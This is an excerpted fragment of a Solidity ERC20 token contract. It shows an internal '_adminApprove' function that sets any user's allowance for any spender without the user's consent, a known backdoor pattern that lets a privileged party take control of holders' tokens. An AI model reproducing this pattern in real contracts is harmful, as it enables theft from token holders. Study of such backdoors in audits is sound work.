...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    //Admin function
     function _adminApprove(address _user, address _spender, uint _amount) internal virtual{
        _allowances[_user][_spender] = _amount;
    }
}
...
contract Token is ERC20{
    ...
    event Allowance(address indexed _user, address indexed _spender,uint _amount);
